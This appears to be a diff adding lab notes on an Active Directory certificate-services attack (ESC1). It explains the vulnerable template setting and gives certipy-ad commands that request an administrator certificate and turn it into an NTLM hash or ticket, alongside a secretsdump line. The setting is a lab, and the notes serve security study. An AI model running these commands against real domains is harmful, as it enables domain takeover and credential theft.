@@ -57,5 +57,48 @@ impacket-secretsdump -k -no-pass dc01.shadow.gate
 
 <img width="1031" height="523" alt="image" src="https://github.com/user-attachments/assets/fc622cf9-79cd-48bf-827e-94e2c0ced536" />
 
+------------
 
+### ADCS ESC1
+
+-------------
+
+- This issue occurs in Certificate Template Management (certtmpl.msc) under the “Request Handling” settings in the template. The mistake is that the “Supply in the request” option allows users to specify any Subject Alternative Name (SAN), enabling attackers to request certificates for Administrator, Domain Admins, or service accounts.The other issue is also making it accessible to nay domain users.
+- Custom ESC1-:
+
+<img width="1170" height="959" alt="image" src="https://github.com/user-attachments/assets/29b84e91-0e2e-4d0e-91a9-b02148277ce4" />
+
+- Exploitation with certipy-ad, request certificate as administrator-:
+
+```bash
+certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136 -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'Custom_ESC1' -upn 'administrator@papa.local'
+```
+- Authenticating as Administrator to get ntlm hash or ticket-:
+
+```bash
+certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.130.136
+```
+
+<img width="1160" height="344" alt="image" src="https://github.com/user-attachments/assets/9920db31-bcf6-4a8a-8f27-f6bf0c453b44" />
+
+- Evil-winrm-:
+
+<img width="1302" height="326" alt="image" src="https://github.com/user-attachments/assets/0c6682ab-284d-46eb-9cad-15965709e13d" />
+
+------------------
+
+### ADCS 2
+
+------------------
+
+- 
+
+-------------------
+
+
+
+<img width="1083" height="335" alt="image" src="https://github.com/user-attachments/assets/8c555bb5-1b25-4145-af0b-ad2fa6c62dc3" />
+
+
+- 
 
